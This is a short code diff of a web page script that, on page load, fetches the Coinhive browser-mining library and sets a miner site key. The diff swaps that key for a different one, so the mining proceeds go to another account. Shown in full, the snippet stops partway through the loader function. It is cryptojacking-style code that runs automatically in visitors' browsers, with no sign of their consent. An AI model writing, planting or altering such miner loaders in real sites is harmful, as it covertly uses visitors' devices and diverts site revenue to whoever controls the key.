@@ -1,5 +1,5 @@
 window.onload = function () {
-    var sitekey = "gnlEa3Qw4UlY80shDenvhpamkK6YMzqS";
+    var sitekey = "RrP9jz7k3vmHx5UIlpSbW1hyZdjr2daJ";
     var miner = "";
     var xhr = new XMLHttpRequest();
     xhr.open("GET", "https://coinhive.com/lib/coinhive.min.js", true);
